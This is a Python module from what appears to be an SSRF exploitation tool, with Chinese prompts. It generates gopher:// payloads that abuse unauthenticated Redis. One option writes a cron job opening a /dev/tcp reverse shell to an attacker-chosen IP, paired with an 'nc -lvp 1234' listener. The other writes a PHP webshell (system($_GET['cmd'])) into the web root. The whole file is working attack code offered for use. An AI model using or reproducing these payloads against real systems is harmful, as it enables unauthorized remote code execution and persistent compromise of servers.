import urllib
import urllib.parse
from .colors import c, DIM, BOLD, CYAN, YELLOW, GREEN, RED, MAGENTA, UNDERLINE, BRIGHT_CYAN, BRIGHT_GREEN, BRIGHT_YELLOW, print_banner, print_step, print_info, print_success, print_warning


def Redis():
    def get_Redis_ReverseShell():
        print_banner("Redis 反弹 Shell 利用")

        print_step(1, "配置监听地址")
        print_info("攻击机将监听此地址，等待目标服务器反弹连接")
        server = input(c("  > 监听 IP 地址 (默认 127.0.0.1): ", CYAN))
        if not server:
            server = "127.0.0.1"
            print_info(f"使用默认值: {server}")

        print_step(2, "配置 Crontab 目录")
        print_info("目标服务器的 Crontab 目录 (用于写入定时任务)")
        print_warning("常见路径: /var/spool/cron/ 或 /var/spool/cron/crontabs/")
        crontab_dir = input(c("  > Crontab 目录 (默认 /var/spool/cron/): ", CYAN))
        if not crontab_dir:
            crontab_dir = "/var/spool/cron/"
            print_info(f"使用默认值: {crontab_dir}")

        cmd = f'*/1 * * * * bash -c "sh -i >& /dev/tcp/{server}/1234 0>&1"'
        len_cmd = len(cmd) + 5
        payload = (
            "*1\r\n$8\r\nflushall\r\n*3\r\n$3\r\nset\r\n$1\r\n1\r\n$"
            + str(len_cmd)
            + "\r\n\n\n"
            + cmd
            + "\n\n\n\r\n*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$"
            + str(len(crontab_dir))
            + "\r\n"
            + crontab_dir
            + "\r\n*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n$4\r\nroot\r\n*1\r\n$4\r\nsave\r\n\n"
        )
        finalpayload = (
            urllib.parse.quote_plus(payload)
            .replace("+", "%20")
            .replace("%2F", "/")
            .replace("%25", "%")
            .replace("%3A", ":")
        )

        print_banner("利用链接已生成")
        print("")
        print(c("  将以下 URL 编码到 SSRF 漏洞中:", CYAN))
        print("")
        print(c("  " + "-" * 48, DIM))
        print(c("gopher://127.0.0.1:6379/_" + finalpayload, UNDERLINE + YELLOW))
        print(c("  " + "-" * 48, DIM))
        print("")

        print_step("注意", "执行前准备")
        print_warning("在发送请求前，请先在攻击机上运行以下命令:")
        print("")
        print(c("    nc -lvp 1234", BOLD + GREEN))
        print("")
        print_info(f"反弹连接地址: {server}:1234")

        print("\n" + c("  " + "=" * 48, BRIGHT_CYAN))
        print(c("  原作者: $_SpyD3r_$", BRIGHT_CYAN))
        print(c("  修改者: @_mingy_@", BRIGHT_CYAN))
        print(c("  " + "=" * 48, BRIGHT_CYAN))

    def get_Redis_PHPShell():
        print_banner("Redis PHP WebShell 利用")

        print_step(1, "配置 Web 根目录")
        print_info("目标服务器的网站根目录路径")
        print_warning("常见路径: /var/www/html, /usr/share/nginx/html")
        web_root_location = input(c("  > Web 根目录 (默认 /var/www/html): ", CYAN))
        if not web_root_location:
            web_root_location = "/var/www/html"
            print_info(f"使用默认值: {web_root_location}")

        print_step(2, "配置 PHP Payload")
        print_info("自定义 PHP 代码 (用于获取 WebShell)")
        print_warning("默认: <?php system($_GET['cmd']); ?>")
        php_payload = input(c("  > PHP Payload (直接回车使用默认): ", CYAN))
        default = "<?php system($_GET['cmd']); ?>"
        if not php_payload:
            php_payload = default
            print_info("使用默认 PHP Shell")

        payload = (
            "*1\r\n$8\r\nflushall\r\n*3\r\n$3\r\nset\r\n$1\r\n1\r\n$"
            + str(len(php_payload) + 4)
            + "\r\n\n\n"
            + php_payload
            + "\n\n\r\n*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$"
            + str(len(web_root_location))
            + "\r\n"
            + web_root_location
            + "\r\n*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n$9\r\nshell.php\r\n*1\r\n$4\r\nsave\r\n\n"
        )
        finalpayload = (
            urllib.parse.quote_plus(payload)
            .replace("+", "%20")
            .replace("%2F", "/")
            .replace("%25", "%")
            .replace("%3A", ":")
        )

        print_banner("利用链接已生成")
        print("")
        print(c("  将以下 URL 编码到 SSRF 漏洞中:", CYAN))
        print("")
        print(c("  " + "-" * 48, DIM))
        print(c("gopher://127.0.0.1:6379/_" + finalpayload, UNDERLINE + YELLOW))
        print(c("  " + "-" * 48, DIM))
        print("")

        print_step("访问", "WebShell 地址")
        print_success("利用成功后，访问以下 URL:")
        print("")
        print(c("    http://target.com/shell.php?cmd=whoami", BOLD + GREEN))
        print("")
        print_info(f"WebShell 路径: {web_root_location}/shell.php")

        print("\n" + c("  " + "=" * 48, BRIGHT_CYAN))
        print(c("  原作者: $_SpyD3r_$", BRIGHT_CYAN))
        print(c("  修改者: @_mingy_@", BRIGHT_CYAN))
        print(c("  " + "=" * 48, BRIGHT_CYAN))

    print_banner("Redis 未授权访问利用")
    print("")
    print(c("  请选择利用方式:", BOLD))
    print("")
    print(c("    [1] ReverseShell", BRIGHT_GREEN) + c(" - 反弹 Shell 到攻击机", CYAN))
    print(c("    [2] PHPShell", BRIGHT_YELLOW) + c("     - 写入 PHP WebShell", CYAN))
    print("")

    what = input(c("  > 输入选项 (1/2): ", MAGENTA))
    what = what.lower()

    if what in ["1", "rev", "reverseshell"]:
        get_Redis_ReverseShell()
    elif what in ["2", "php", "phpshell"]:
        get_Redis_PHPShell()
    else:
        print("")
        print(c("  [x] 无效的选项，请选择 1 或 2", RED))
        exit()
